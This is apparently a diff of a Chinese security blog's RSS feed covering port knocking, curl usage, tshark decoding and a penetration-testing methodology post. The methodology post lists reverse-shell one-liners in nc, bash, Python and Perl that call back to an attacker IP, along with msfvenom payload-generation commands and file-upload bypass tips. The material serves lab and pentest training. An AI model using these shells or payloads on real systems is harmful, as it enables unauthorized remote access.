-</span></span></code></pre></div><p>解释一下最底下这个命令，这是一个完整的网络数据分析流程，从抓包文件 Enilmalus.pcap 中提取原始数据并将其转换为人类可读的文件。命令从 tshark 开始，它是 wireshark 的命令行版本，用于处理网络流量，前面捕捉流量，现在读取，-r 时 read 的缩写，指示 tshark 从 Enilmalus.pcap 中读取数据：-T 是 type 的缩写，指定输出类型为 fields（字段），表示以字段形式输出而不是完整的数据包详情；-e 是 extract 的缩写，后面接 data，告诉 tshark 提取每个数据包的原始负载，通常以十六进制字符串形式输出，例如 <code>48 65 6c 6c 6f</code>。接着，管道符号 <code>|</code> 将输出传递给 tr ，这是一个 translate 的工具；-d 是 delete 的缩写，后面跟 <code>' '</code> ，表示一处所有空格，表示移除所有空格，把带空格的 <code>48 65 6c 6c 6f</code> 变成 <code>48656c6c6f</code>。最后，另一个管道  <code>|</code> 将结果交给 xxd。一个处理十六进制字符串的工具，其名称为 <code>hexadecimal</code> 和 <code>dump</code> 的组合，用于创建或解析数据的十六进制转储；-r 是 reverse 的缩写，表示将十六进制字符串转换为二进制；-p 是 plaintext 的缩写，处理没有分隔符的连续十六进制字符串，最终 <code>48656c6c6f</code> 解读为可读的 <code>Hello</code>。</p>
-]]></content></item><item><title>端口敲门与单包授权与零开端口</title><link>https://enilmalus.github.io/posts/%E7%AB%AF%E5%8F%A3%E6%95%B2%E9%97%A8%E5%8D%95%E5%8C%85%E6%8E%88%E6%9D%83%E4%B8%8E%E9%9B%B6%E5%BC%80%E7%AB%AF%E5%8F%A3/</link><pubDate>Tue, 30 Dec 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E7%AB%AF%E5%8F%A3%E6%95%B2%E9%97%A8%E5%8D%95%E5%8C%85%E6%8E%88%E6%9D%83%E4%B8%8E%E9%9B%B6%E5%BC%80%E7%AB%AF%E5%8F%A3/</guid><description>端口敲门 端口敲门（port knocking）技术是一种基于隐蔽认证的安全机制，允许在默认关闭所有入站端口的情况下，仅通过特定顺序的端口访问来动态开放特定服务。其核心思想是服务器在初始状态下屏蔽所有连接，只有当客户端按预设顺序向多个端口发送数据包时，服务器才能识别合法模式并临时修改防火墙规则，允许特定 IP 访问受保护的端口，比如 SSH、RDP、Web 服务等。这种方式可以隐藏关键端口，防止端口扫描工具探测到开放的服务，从而降低被攻击的风险。
-实现端口敲门通常依赖 knockd 这类监听工具，它监测入站数据包，识别预定义的敲门序列，并在匹配成功后执行相应的防火墙命令。例如，可以配置规则服务器在接收到 7000-&amp;gt;8000-&amp;gt;9000 端口顺序连接后，动态放行 SSH 端口，同时可以设定 9000-&amp;gt;8000-&amp;gt;7000 作为关闭 SSH 端口的敲门序列。客户端只需要发送正确的敲门请求，就能临时开启远程管理端口，使用 SSH 连接服务器，操作完成后再敲门恢复防火墙规则，确保端口重新关闭。
-这种方式的优点在于可以有效减少攻击面，避免端口扫描暴露服务，适合用于保护 SSH 等关键管理端口，同时不需要额外的 VPN 或复杂的加密认证方案，资源占用极低。然而，端口敲门也有明显的局限性，比如攻击者能监听流量，就可能获取端口序列并复现攻击。此外，每次访问都需要先发送敲门序列，增加运维成本。为了解决这个问题，可以使用更安全的 单包授权（SPA） 机制，例如 fwknop 这类工具，它通过 GnuPG 加密的单一 UDP 数据包进行认证，避免传统敲门方式可能被监听和重放的风险。
-在实际应用中，端口敲门适用于 SSH 服务器的控制访问、隐藏数据库和管理面板等关键服务、以及提供短期远程管理权限，特别是在企业安全策略中，可作为 零开端口（Zero Open Port） 方案的一部分，有效减少暴露面，提高服务器安全性。
-下面是端口敲门的命令演示：
-knock 敲门演示：
-┌──(kali㉿kali)-[~/Work/Kali] └─$ knock -v 10.10.10.45 197 719 801 983 hitting tcp 10.10.10.45:197 hitting tcp 10.10.10.45:719 hitting tcp 10.10.10.45:801 hitting tcp 10.10.10.45:983 nc 敲门演示：
-┌──(kali㉿kali)-[~/Work/Kali] └─$ for port in 197 719 801 983 ; do nc -zv 10.</description><content type="html"><![CDATA[<h2 id="端口敲门">端口敲门</h2>
-<p>端口敲门（port knocking）技术是一种基于隐蔽认证的安全机制，允许在默认关闭所有入站端口的情况下，仅通过特定顺序的端口访问来动态开放特定服务。其核心思想是服务器在初始状态下屏蔽所有连接，只有当客户端按预设顺序向多个端口发送数据包时，服务器才能识别合法模式并临时修改防火墙规则，允许特定 IP 访问受保护的端口，比如 SSH、RDP、Web 服务等。这种方式可以隐藏关键端口，防止端口扫描工具探测到开放的服务，从而降低被攻击的风险。</p>
-<p>实现端口敲门通常依赖 knockd 这类监听工具，它监测入站数据包，识别预定义的敲门序列，并在匹配成功后执行相应的防火墙命令。例如，可以配置规则服务器在接收到 <code>7000-&gt;8000-&gt;9000</code> 端口顺序连接后，动态放行 SSH 端口，同时可以设定 <code>9000-&gt;8000-&gt;7000</code> 作为关闭 SSH 端口的敲门序列。客户端只需要发送正确的敲门请求，就能临时开启远程管理端口，使用 SSH 连接服务器，操作完成后再敲门恢复防火墙规则，确保端口重新关闭。</p>
-<p>这种方式的优点在于可以有效减少攻击面，避免端口扫描暴露服务，适合用于保护 SSH 等关键管理端口，同时不需要额外的 VPN 或复杂的加密认证方案，资源占用极低。然而，端口敲门也有明显的局限性，比如攻击者能监听流量，就可能获取端口序列并复现攻击。此外，每次访问都需要先发送敲门序列，增加运维成本。为了解决这个问题，可以使用更安全的 <code>单包授权（SPA）</code> 机制，例如 fwknop 这类工具，它通过 GnuPG 加密的单一 UDP 数据包进行认证，避免传统敲门方式可能被监听和重放的风险。</p>
-<p>在实际应用中，端口敲门适用于 SSH 服务器的控制访问、隐藏数据库和管理面板等关键服务、以及提供短期远程管理权限，特别是在企业安全策略中，可作为 <code>零开端口（Zero Open Port）</code> 方案的一部分，有效减少暴露面，提高服务器安全性。</p>
-<p>下面是端口敲门的命令演示：</p>
-<p>knock 敲门演示：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ knock -v 10.10.10.45 <span style="color:#ae81ff">197</span> <span style="color:#ae81ff">719</span> <span style="color:#ae81ff">801</span> <span style="color:#ae81ff">983</span>
-</span></span><span style="display:flex;"><span>hitting tcp 10.10.10.45:197
-</span></span><span style="display:flex;"><span>hitting tcp 10.10.10.45:719
-</span></span><span style="display:flex;"><span>hitting tcp 10.10.10.45:801
-</span></span><span style="display:flex;"><span>hitting tcp 10.10.10.45:983
-</span></span></code></pre></div><p>nc 敲门演示：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ <span style="color:#66d9ef">for</span> port in <span style="color:#ae81ff">197</span> <span style="color:#ae81ff">719</span> <span style="color:#ae81ff">801</span> <span style="color:#ae81ff">983</span> ; <span style="color:#66d9ef">do</span> nc -zv 10.10.10.45 $port;sleep 1; <span style="color:#66d9ef">done</span>
-</span></span></code></pre></div><p>解释一下这个 nc 命令，先循环这四个端口，依次赋值给 $port ，接着 nc 使用 -z 零模式，只尝试连接，不发送任何数据，连接成功说明端口开放，-v 详细输出，显示连接结果，暂停 1 秒接着执行。</p>
-<h2 id="单包授权spa">单包授权（SPA）</h2>
-<p>单包授权（SPA，Single Packet Authorization）是一种通过单个网络数据包完成身份验证，从而零食开放访问权限的安全技术。未通过认证前服务对外不开放，只有合法客户端发出一个携带认证信息的单包（可以是 UDP/TCP/ICMP，内涵加密后的身份信息、令牌等），通过认证后才会临时开放服务。</p>
-<p>传统 TCP/IP 的原则为 先连后验，端口必须对外开放，连接建立后才做认证。</p>
-<h2 id="零开端口zero-open-port">零开端口（Zero Open Port）</h2>
-<p>零开端口（Zero Open Port）就是对外关闭所有端口，无任何服务监听。</p>
-]]></content></item><item><title>Bastard Writeup</title><link>https://enilmalus.github.io/posts/bastard-writeup/</link><pubDate>Sun, 28 Dec 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/bastard-writeup/</guid><description>本文章以 kali 地址为 10.10.16.46 做演示
+</span></span></code></pre></div>]]></content></item><item><title>Bastard Writeup</title><link>https://enilmalus.github.io/posts/bastard-writeup/</link><pubDate>Sun, 28 Dec 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/bastard-writeup/</guid><description>本文章以 kali 地址为 10.10.16.46 做演示
 初始侦察 nmap 端口扫描 ┌──(kali㉿kali)-[~/Work/Kali] └─$ sudo nmap --min-rate 10000 -p- 10.129.6.171 -oA nmap/ports [sudo] password for kali: Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 08:11 EST Nmap scan report for 10.129.6.171 Host is up (0.39s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 49154/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 15.</description><content type="html"><![CDATA[<blockquote>
 <p>本文章以 kali 地址为 10.10.16.46 做演示</p>
 </blockquote>
@@ -7723,441 +7368,6 @@ knock 敲门演示：
 </span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
 </span></span><span style="display:flex;"><span>   n,Invoke-PowerShellTcp
 </span></span></code></pre></div><p><img src="root.png" alt="root"></p>
-]]></content></item><item><title>Curl 使用详解</title><link>https://enilmalus.github.io/posts/curl-%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</link><pubDate>Sun, 28 Dec 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/curl-%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</guid><description>curl 原理剖析 curl 核心机制 Libcurl 驱动：curl 是 libcurl 库的命令行前端，实际上 curl 的每一个参数都在映射 libcurl 的 curl_easy_setopt() 函数调用。 协议自动协商：curl 不仅发送 HTTP，它会根据 URL scheme（ftp://、dict://、gopher://）自动切换底层协议栈。 连接复用：再以此命令中请求多个 URL 时，curl 会尝试复用 TCP 连接 Libcurl 是 curl 项目提供的跨平台 C 库，用于处理 URL 数据传输，支持 HTTP、FTP、SMTP 等多种协议。
-curl 参数详解 curl 帮助命令 下面为 curl 详细地帮助命令
-┌──(kali㉿kali)-[~/Work/Kali] └─$ curl -h Usage: curl [options...] &amp;lt;url&amp;gt; -d, --data &amp;lt;data&amp;gt; HTTP POST data -f, --fail Fail fast with no output on HTTP errors -h, --help &amp;lt;subject&amp;gt; Get help for commands -o, --output &amp;lt;file&amp;gt; Write to file instead of stdout -O, --remote-name Write output to file named as remote file -i, --show-headers Show response headers in output -s, --silent Silent mode -T, --upload-file &amp;lt;file&amp;gt; Transfer local FILE to destination -u, --user &amp;lt;user:password&amp;gt; Server user and password -A, --user-agent &amp;lt;name&amp;gt; Send User-Agent &amp;lt;name&amp;gt; to server -v, --verbose Make the operation more talkative -V, --version Show version number and quit This is not the full help; this menu is split into categories.</description><content type="html"><![CDATA[<h2 id="curl-原理剖析">curl 原理剖析</h2>
-<h3 id="curl-核心机制">curl 核心机制</h3>
-<ul>
-<li>Libcurl 驱动：curl 是 libcurl 库的命令行前端，实际上 curl 的每一个参数都在映射 libcurl 的 curl_easy_setopt()  函数调用。</li>
-<li>协议自动协商：curl 不仅发送 HTTP，它会根据 URL scheme（ftp://、dict://、gopher://）自动切换底层协议栈。</li>
-<li>连接复用：再以此命令中请求多个 URL 时，curl 会尝试复用 TCP 连接</li>
-</ul>
-<blockquote>
-<p>Libcurl 是 curl 项目提供的跨平台 C 库，用于处理 URL 数据传输，支持 HTTP、FTP、SMTP 等多种协议。</p>
-</blockquote>
-<h2 id="curl-参数详解">curl 参数详解</h2>
-<h3 id="curl-帮助命令">curl 帮助命令</h3>
-<p>下面为 curl 详细地帮助命令</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ curl -h                             
-</span></span><span style="display:flex;"><span>Usage: curl <span style="color:#f92672">[</span>options...<span style="color:#f92672">]</span> &lt;url&gt;
-</span></span><span style="display:flex;"><span> -d, --data &lt;data&gt;           HTTP POST data
-</span></span><span style="display:flex;"><span> -f, --fail                  Fail fast with no output on HTTP errors
-</span></span><span style="display:flex;"><span> -h, --help &lt;subject&gt;        Get help <span style="color:#66d9ef">for</span> commands
-</span></span><span style="display:flex;"><span> -o, --output &lt;file&gt;         Write to file instead of stdout
-</span></span><span style="display:flex;"><span> -O, --remote-name           Write output to file named as remote file
-</span></span><span style="display:flex;"><span> -i, --show-headers          Show response headers in output
-</span></span><span style="display:flex;"><span> -s, --silent                Silent mode
-</span></span><span style="display:flex;"><span> -T, --upload-file &lt;file&gt;    Transfer local FILE to destination
-</span></span><span style="display:flex;"><span> -u, --user &lt;user:password&gt;  Server user and password
-</span></span><span style="display:flex;"><span> -A, --user-agent &lt;name&gt;     Send User-Agent &lt;name&gt; to server
-</span></span><span style="display:flex;"><span> -v, --verbose               Make the operation more talkative
-</span></span><span style="display:flex;"><span> -V, --version               Show version number and quit
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>This is not the full help; this menu is split into categories.
-</span></span><span style="display:flex;"><span>Use <span style="color:#e6db74">&#34;--help category&#34;</span> to get an overview of all categories, which are:
-</span></span><span style="display:flex;"><span>auth, connection, curl, deprecated, dns, file, ftp, global, http, imap, ldap, output, pop3, post, proxy, scp, sftp, smtp, ssh, telnet, tftp, timeout, tls, upload, verbose.
-</span></span><span style="display:flex;"><span>Use <span style="color:#e6db74">&#34;--help all&#34;</span> to list all options
-</span></span><span style="display:flex;"><span>Use <span style="color:#e6db74">&#34;--help [option]&#34;</span> to view documentation <span style="color:#66d9ef">for</span> a given option
-</span></span></code></pre></div><h3 id="参数详解">参数详解</h3>
-<h4 id="-d--data-data-参数">-d/&ndash;data &lt;data&gt; 参数</h4>
-<p>使用 -d 参数，curl 默认将 HTTP 方法切换为 POST，默认 Content-Type 被设置为 <code>application/x-www-form-urlencoded</code> 。</p>
-<h4 id="-t--upload-file-file-参数">-T/&ndash;upload-file &lt;file&gt; 参数</h4>
-<p>文件上传</p>
-<h4 id="-a--user-agent-name-参数">-A/&ndash;user-agent &lt;name&gt; 参数</h4>
-<p>修改 HTTP 请求头中的 User-Agent 字段</p>
-<h4 id="-u--user-userpassword-参数">-u/&ndash;user &lt;user:password&gt; 参数</h4>
-<p>将 user:password 进行 Base64 编码，并添加到 <code>Header: Authorization: Basic &lt;base64_string&gt;。</code></p>
-<h4 id="-v--verbose-参数">-v/&ndash;verbose 参数</h4>
-<p>这个参数是笔者在实际渗透测试中最常用的参数之一，作用为开启详细模式，便于阅读返回的数据。</p>
-<h4 id="-i--show-headers-参数">-i/&ndash;show-headers 参数</h4>
-<p>查看响应头。</p>
-<h4 id="-f--fail-参数">-f/&ndash;fail 参数</h4>
-<p>即使服务器返回 404 或 500 也会输出页面内容。</p>
-<h4 id="-o-filename-o">-o filename/-O</h4>
-<ul>
-<li>-o enil：重命名保存为名称为 enil 的文件。</li>
-<li>-O：原名保存。</li>
-</ul>
-<h4 id="-s-参数">-s 参数</h4>
-<p>静默模式，不显示进度条。</p>
-]]></content></item><item><title>渗透测试通用方法论</title><link>https://enilmalus.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E8%AE%BA/</link><pubDate>Sat, 27 Dec 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E8%AE%BA/</guid><description>本文章持续更新中
-遇见的情况以及方法论 图片分析 图片分析一般先查看隐写情况。
-┌──(kali㉿kali)-[~/Work/Kali] └─$ steghide extract -sf x.jpg Enter passphrase: 解释一下这个命令，extract 为提取模式，提取图片中隐藏的内容，-sf 为 &amp;ndash;stegofile 的缩写，指定文件为 x.jpg。需要密码的话想到的、空密码、弱密码均值得尝试。
-Bash 逃逸 在获得初始立足点后常常 bash 的交互性并不完善，通常使用 python 的 pty 库获得一个假的、交互性相对好的 bash。
-python3 -c &amp;#34;import pty;pty.spawn(&amp;#39;/bin/bash&amp;#39;);&amp;#34; 运行上面这个命令时，Python 调用 pty.spawn() 函数，创建一个伪终端（pseudo-terminal，简称 pty），并在该终端启动一个心得交互式 bash shell 进程。这个新的伪终端具有完整的交互能力，能够处理用户输入、输出以及终端控制信息（如回显密码提示）。一旦这个新的 shell 被创建就相当于处于一个真正的交互终端中。
-也可以尝试下面的命令。
-script -qc /bin/bash /dev/null script 时 Linux 系统自带的命令，用于记录终端会话。正常使用 script 命令时，会创建一个交互式终端并将所有会话内容记录到指定文件中。这里巧用几个特殊参数：-q 静默模式，告诉 script 不要显示开始和结束的提示信息。其次是 -c /bin/bash 告诉 script 命令，直接执行并启动一个 bash shell，而非默认 shell 或其他命令。最后，指定输出文件为 /dev/null，表示会话记录被丢弃而不保存到硬盘。
-反弹 shell Linux 现成的反弹 shell nc -e /bin/bash 10.</description><content type="html"><![CDATA[<blockquote>
-<p>本文章持续更新中</p>
-</blockquote>
-<h2 id="遇见的情况以及方法论">遇见的情况以及方法论</h2>
-<h3 id="图片分析">图片分析</h3>
-<p>图片分析一般先查看隐写情况。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ steghide extract -sf x.jpg
-</span></span><span style="display:flex;"><span>Enter passphrase:
-</span></span></code></pre></div><p>解释一下这个命令，extract 为提取模式，提取图片中隐藏的内容，-sf 为 &ndash;stegofile 的缩写，指定文件为 x.jpg。需要密码的话想到的、空密码、弱密码均值得尝试。</p>
-<h3 id="bash-逃逸">Bash 逃逸</h3>
-<p>在获得初始立足点后常常 bash 的交互性并不完善，通常使用 python 的 pty 库获得一个假的、交互性相对好的 bash。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34;</span>
-</span></span></code></pre></div><p>运行上面这个命令时，Python 调用 pty.spawn() 函数，创建一个伪终端（pseudo-terminal，简称 pty），并在该终端启动一个心得交互式 bash shell 进程。这个新的伪终端具有完整的交互能力，能够处理用户输入、输出以及终端控制信息（如回显密码提示）。一旦这个新的 shell 被创建就相当于处于一个真正的交互终端中。</p>
-<p>也可以尝试下面的命令。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>script -qc /bin/bash /dev/null
-</span></span></code></pre></div><p>script 时 Linux 系统自带的命令，用于记录终端会话。正常使用 script 命令时，会创建一个交互式终端并将所有会话内容记录到指定文件中。这里巧用几个特殊参数：-q 静默模式，告诉 script 不要显示开始和结束的提示信息。其次是 -c /bin/bash 告诉 script 命令，直接执行并启动一个 bash shell，而非默认 shell 或其他命令。最后，指定输出文件为 /dev/null，表示会话记录被丢弃而不保存到硬盘。</p>
-<h3 id="反弹-shell">反弹 shell</h3>
-<h4 id="linux">Linux</h4>
-<h5 id="现成的反弹-shell">现成的反弹 shell</h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -e /bin/bash 10.10.10.5 <span style="color:#ae81ff">4444</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.5/4444 0&gt;&amp;1&#34;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.5&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>perl -e <span style="color:#e6db74">&#39;use Socket;$i=&#34;10.10.10.5&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
-</span></span></code></pre></div><h5 id="msfvenom">Msfvenom</h5>
-<p>Msf 生成反弹 shell</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.10.5 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f elf -o shell.elf
-</span></span></code></pre></div><p>生成二进制脚本</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.10.5 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -b <span style="color:#e6db74">&#34;\x00&#34;</span> -e x86/shikata_ga_nai -f c
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfvenom -p linux/x86/exec CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span> -b <span style="color:#e6db74">&#34;\x00&#34;</span> -e x86/shikata_ga_nai -f c
-</span></span></code></pre></div><h3 id="文件分析">文件分析</h3>
-<p>在拿到一个文件后可进行如下分析：</p>
-<p><img src="P1.png" alt="P1"></p>
-<p>file 命令是识别文件类型和格式，通过分析文件头信息等数据来判断文件实际的内容与格式，从输出结果来看， /bin/dartvader 是一个 32 位的 ELF 可执行文件，并设置了 setuid 位，这意味着无论哪个用户执行这个程序，它都会以文件所有者的权限进行，动态链接表明该程序在运行时需要调用共享库，而 <code>not stripped</code> 则说明这个可执行文件中仍保留有符号信息与调试信息，这对逆向工程非常有利。在渗透测试场景下，如果测试者发现这样一个 setuid 程序，可以重点关注它是否存在提权漏洞，比如通过错误的权限验证、缓冲区溢出或者不安全的函数调用来实现提权。此外，未剥离的符号信息可能让分析人员更容易理解程序的内部逻辑，从而寻找可能的漏洞或不当行为，这对进一步的利用或者漏洞利用代码的编写往往有利，可以看一下可识别字符佐证发现。</p>
-<p>来看这个例子：</p>
-<p><img src="P2.png" alt="P2"></p>
-<p><code>ELF -64-bit LSB</code> 表明该文件是 Linux 上常见的 ELF 格式可执行程序，架构为 64 位的 x86-64（也称 AMD64）。对反编译而言，这意味着再选职责反编译或调试工具时需要考虑 64 位指令集。<code>pie executable</code> 表明程序启用了位置无关可执行（Position Independent Executable，PIE）技术。这意味着程序每次加载到i内存中时，代码段的位置都是随机的，增加了逆向和漏洞利用的难度。反编译或漏洞的分析时必须考虑地址随机化因素。<code>dynamically linked</code> 表明程序采用动态链接，运行时依赖外部库（如标准 C 库 libc.so）。反编译过程中需要考虑并分析外部库函数的调用情况，可能需要加载外部符号或调试符号以便准确还原函数调用。<code>interpreter /lib64/ld-linux-x86-64.so.2</code> 提供了动态链接器路径，它指定程序执行时所使用的动态链接器的位置和名称。反编译和调试时，如出现共享库缺失问题或分析动态过程中的异常行为，可以通过这个链接器路径进行排查。<code>BuildID\[sha1\]=xxxxx</code> 时程序编译时生成的唯一构建标识（Build ID），可以用于明确程序版本、溯源编译信息或追踪程序来源。在逆向和取证中，可以通过此标志确定二进制文件是否发生过篡改、修改或重新编译。<code>for GNU/Linux 3.2.0</code> 指定了程序编译时所期待的 Linux 内核版本。在反编译和漏洞分析时，这有助于确定目标程序的运行环境，尤其当你考虑内核漏洞、兼容性或系统调用（syscall）行为时非常关键。</p>
-<p>最后的 <code>not stripped</code> 表明程序未进行符号剥离。这是对反编译而言非常利好的信息。因为这意味着程序的符号表、函数名、变量名、调试信息都被保留了下来，极大简化了反编译和逆向分析的难度，更容易直接恢复接近源代码的形式。、7</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ strings /bin/dartVader
-</span></span></code></pre></div><p>strings 默认情况下会从文件中连续提取长度大于等于 4 的字符（可通过 -n 参数调整），且属于 ASCII 可打印字符序列，其他非打印字符被忽略。在渗透测试中， string 的使用场景及其广泛，例如：渗透测试时拿到了一个可疑的 ELF 文件，运行 strings 可以快速发现硬编码的密码、域名、文件路径等敏感信息，帮助快速判断下一步攻击路径；对未知为文件快速扫描，也可以快速提取潜在可读信息，提升分析效率。</p>
-<h3 id="将文件从-ssh-中拿出">将文件从 ssh 中拿出</h3>
-<p>以下面这个命令为例，将 ssh 用户 erso 的 /bin/dartVader 文件下载到当前目录，指定 ssh 端口位 10110。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ scp -P <span style="color:#ae81ff">10110</span> -q erso@10.110.10.45:/bin/dartVader .
-</span></span></code></pre></div><h3 id="使用-curl-将返回的内容输出为中文">使用 curl 将返回的内容输出为中文</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ curl -s http://10.10.10.45/secret | trans -b :zh
-</span></span></code></pre></div><p>trans（translate-shell）是很不错的命令行翻译工具。</p>
-<h3 id="idor-不安全直接对象引用">IDOR 不安全直接对象引用</h3>
-<p>IDOR（Insecure Direct Object Reference，不安全的直接对象引用）是一种常见的访问控制漏洞，主要出现在 Web 应用请求的资源未进行有效的权限验证和限制的情况下。具体来说，应用程序通过用户提交的参数（如用户ID、文件名、订单号等）直接引用内部对象，却未验证当前用户是否拥有访问这些对象的权限。这种情况下，攻击者可以通过修改请求的参数值（例如 ID 号）直接访问或操作本不该被访问到的敏感信息或资源，从而实现越权访问。例如，在一个用户个人信息页面中，如果 URL 参数形如 user?id=1，攻击者只需要修改 id 值即可查看其他用户的数据。当开发者未对资源引用和权限做严格验证时，IDOR 漏洞便会产生，攻击者通过简单篡改请求参数即可实现攻击。</p>
-<h3 id="文件上传">文件上传</h3>
-<p>有些表单原本只可以上传 jpg、git、png 等图片格式文件，为什么最终却可以上传 .phtml 和 .phar 格式文件呢？因为 .phtml 和 .phar 两种文件格式比较特殊，.phtml 是一种 PHP 常规拓展名，早期较为常见，现在虽然使用较少但依旧默认会被 PHP 引擎解析，这使得攻击者能够通过上传该格式的文件直接执行恶意 PHP 代码。而 .phar 更加特殊，它本质上是 PHP 的归档文件格式（PHP Archive），也可以执行。</p>
-<h3 id="添加-hosts-记录">添加 hosts 记录</h3>
